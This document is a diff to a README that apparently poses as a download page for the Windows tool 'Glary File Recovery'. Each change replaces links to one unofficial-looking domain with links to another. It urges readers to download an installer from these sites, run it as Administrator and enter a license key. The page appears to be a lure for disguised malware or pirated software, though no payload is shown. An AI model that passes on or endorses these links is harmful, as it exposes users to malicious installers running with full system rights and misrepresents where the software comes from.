@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **Glary File Recovery** for Windows.
 
 <p align="center">
-  <a href="https://glaryrecovery.zipzapsol.space/">
+  <a href="https://glaryrecovery.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-Glary%20File%20Recovery-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Glary File Recovery">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[glaryrecovery.zipzapsol.space](https://glaryrecovery.zipzapsol.space/)** |
-| **Full URL** | `https://glaryrecovery.zipzapsol.space/` |
+| **Direct link** | **[glaryrecovery.wonderchain.fun](https://glaryrecovery.wonderchain.fun/)** |
+| **Full URL** | `https://glaryrecovery.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — glaryrecovery.zipzapsol.space](https://glaryrecovery.zipzapsol.space/)** (link above)
+1. Click **[Download — glaryrecovery.wonderchain.fun](https://glaryrecovery.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://glaryrecovery.zipzapsol.space/"><strong>⬇ Download Glary File Recovery now</strong></a></p>
+<p align="center"><a href="https://glaryrecovery.wonderchain.fun/"><strong>⬇ Download Glary File Recovery now</strong></a></p>
 
 ---
 
